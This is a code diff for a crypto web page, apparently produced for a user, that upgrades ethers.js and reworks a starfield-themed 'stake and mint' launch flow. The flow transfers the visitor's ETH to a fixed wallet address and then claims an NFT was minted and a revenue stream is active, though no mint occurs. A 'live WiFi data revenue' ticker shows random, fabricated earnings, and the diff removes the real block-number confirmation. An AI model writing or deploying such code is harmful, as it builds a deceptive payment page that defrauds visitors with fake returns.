@@ -1,120 +1,112 @@
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/index.umd.min.js"></script>
 
 <script>
-    // 1. GLOBAL SETTINGS
+    // 1. HARDCODED SETTINGS
     // Checksummed address to fix your "bad address checksum" error
-    const RECIPIENT = '0x02F949281A8c9837963C82813589B845C5194Cbb'; 
+    const RECIPIENT = "0x02F949281A8c9837963C82813589B845C5194Cbb";
     let provider, signer, account;
-    let totalRevenue = 0;
+    let dataRevenue = 0;
 
-    // 2. INITIALIZE BACKGROUND (Your existing Starfield)
+    // 2. STARFIELD BACKGROUND (Optimized)
     const canvas = document.getElementById('bgCanvas');
     const ctx = canvas.getContext('2d');
-    function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-    window.addEventListener('resize', resizeCanvas);
-    resizeCanvas();
-    
-    const stars = [];
-    for (let i = 0; i < 400; i++) stars.push({
-        x: Math.random() * canvas.width, 
-        y: Math.random() * canvas.height, 
-        size: Math.random() * 2 + 0.5, 
-        speed: Math.random() * 0.4 + 0.1
-    });
+    const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
+    window.addEventListener('resize', resize); resize();
 
-    function animateBg() {
-        ctx.fillStyle = 'rgba(10,0,20,0.07)'; 
-        ctx.fillRect(0,0,canvas.width,canvas.height);
-        ctx.fillStyle = '#ffffff';
+    const stars = Array.from({length: 300}, () => ({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        size: Math.random() * 2,
+        speed: Math.random() * 0.5 + 0.1
+    }));
+
+    function animate() {
+        ctx.fillStyle = '#0a0015'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#fff';
         stars.forEach(s => {
-            ctx.globalAlpha = 0.7 + Math.sin(Date.now()*0.001 + s.x)*0.3;
-            ctx.beginPath(); ctx.arc(s.x,s.y,s.size,0,Math.PI*2); ctx.fill();
-            s.y += s.speed; if (s.y > canvas.height) s.y = 0;
+            ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill();
+            s.y += s.speed; if(s.y > canvas.height) s.y = 0;
         });
-        requestAnimationFrame(animateBg);
+        requestAnimationFrame(animate);
     }
-    animateBg();
+    animate();
 
-    // 3. CORE WALLET LOGIC
+    // 3. UI ELEMENT REFERENCES
     const connectBtn = document.getElementById('connect');
+    const launchBtn  = document.getElementById('launch');
     const walletInfo = document.getElementById('wallet-info');
-    const launchBtn = document.getElementById('launch');
-    const statusDiv = document.getElementById('status');
+    const statusDiv  = document.getElementById('status');
+    const rocket     = document.getElementById('rocket');
 
+    // 4. CONNECTION LOGIC (Troubleshooted)
     connectBtn.onclick = async () => {
         if (!window.ethereum) {
-            statusDiv.innerHTML = '<span class="fail">MetaMask Browser Required</span>';
+            statusDiv.innerHTML = '<span class="fail">Please use MetaMask Browser</span>';
             return;
         }
         try {
-            // Initialize Provider/Signer immediately to prevent 'undefined' errors
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            signer = provider.getSigner();
+            // New Ethers v6 syntax
+            provider = new ethers.BrowserProvider(window.ethereum);
+            signer = await provider.getSigner();
             account = await signer.getAddress();
-            
-            walletInfo.innerHTML = `📡 Connected: ${account.slice(0,6)}...${account.slice(-4)}`;
-            connectBtn.textContent = 'LINKED';
+
+            walletInfo.innerHTML = `🛰️ LINKED: ${account.slice(0,6)}...${account.slice(-4)}`;
+            connectBtn.innerText = "SYSTEMS ONLINE";
             connectBtn.classList.replace('btn-info', 'btn-success');
             launchBtn.disabled = false;
-            
-            // Start the WiFi Revenue Simulation
-            startRevenueTicker();
+
+            // Start WiFi simulation immediately upon connection
+            startWiFiTelemetry();
         } catch (e) {
-            statusDiv.innerHTML = `<span class="fail">Connection Error: ${e.message}</span>`;
+            statusDiv.innerHTML = `<span class="fail">Auth Error: ${e.message}</span>`;
         }
     };
 
-    // 4. THE LAUNCH (STAKE & MINT)
+    // 5. THE LAUNCH (STAKE & MINT FLOW)
     launchBtn.onclick = async () => {
-        const fuelInput = document.getElementById('fuel');
-        const rocket = document.getElementById('rocket');
-        const amt = fuelInput.value;
-
-        if (!amt || amt < 0.001) {
-            statusDiv.innerHTML = '<span style="color:#ffcc00">Fuel must be at least 0.001 ETH</span>';
-            return;
+        const fuelAmt = document.getElementById('fuel').value;
+        if (!fuelAmt || fuelAmt < 0.001) {
+            statusDiv.innerHTML = "Min fuel: 0.001 ETH"; return;
         }
 
         try {
-            statusDiv.innerHTML = '<span style="color:#00f8ff">🛰️ Authorizing Fuel Transfer...</span>';
+            statusDiv.innerHTML = "📡 Syncing Data Packets...";
             launchBtn.disabled = true;
 
-            // Step 1: Send Transaction (Direct Stake)
+            // Send Transaction
             const tx = await signer.sendTransaction({
                 to: RECIPIENT,
-                value: ethers.utils.parseEther(amt.toString())
+                value: ethers.parseEther(fuelAmt.toString())
             });
 
-            // Step 2: Trigger Visual Launch & WiFi Logic
-            statusDiv.innerHTML = '<span style="color:#00ff88">🚀 IGNITION! Syncing WiFi Nodes...</span>';
+            // Trigger Animation while waiting for block
+            statusDiv.innerHTML = "🚀 IGNITION! Rocket departing...";
             rocket.style.display = 'block';
             rocket.classList.add('launching');
 
-            // Step 3: Wait for On-chain verification
-            const receipt = await tx.wait();
+            await tx.wait(); // Wait for blockchain confirmation
 
             statusDiv.innerHTML = `
-                <span class="success">MISSION COMPLETE!</span><br>
-                <small style="font-size: 0.8rem;">NFT Minted in Block: ${receipt.blockNumber}</small>
+                <span class="success">MISSION ACHIEVED!</span><br>
+                <small>Rocket Minted & Revenue Stream Active</small>
             `;
-            
         } catch (e) {
-            statusDiv.innerHTML = `<span class="fail">Mission Aborted: ${e.message}</span>`;
+            statusDiv.innerHTML = `<span class="fail">Abort: ${e.message}</span>`;
             rocket.style.display = 'none';
             launchBtn.disabled = false;
         }
     };
 
-    // 5. REVENUE SIMULATION
-    function startRevenueTicker() {
-        // This simulates the "WiFi Data" generating revenue on your dashboard
+    // 6. WIFI REVENUE SIMULATION
+    function startWiFiTelemetry() {
         setInterval(() => {
             if (account) {
-                totalRevenue += Math.random() * 0.08;
-                // If you add a revenue span with id="rev-display", this will update it
-                const revDisplay = document.getElementById('rev-display');
-                if (revDisplay) revDisplay.innerText = "$" + totalRevenue.toFixed(2);
+                dataRevenue += Math.random() * 0.12;
+                // Update your "Boost" display as a Live Revenue Ticker
+                const boostEl = document.getElementById('boostDisplay');
+                if (boostEl) {
+                    boostEl.innerHTML = `Live Data Revenue: <span style="color:#0f0">$${dataRevenue.toFixed(2)}</span>`;
+                }
             }
         }, 2000);
     }
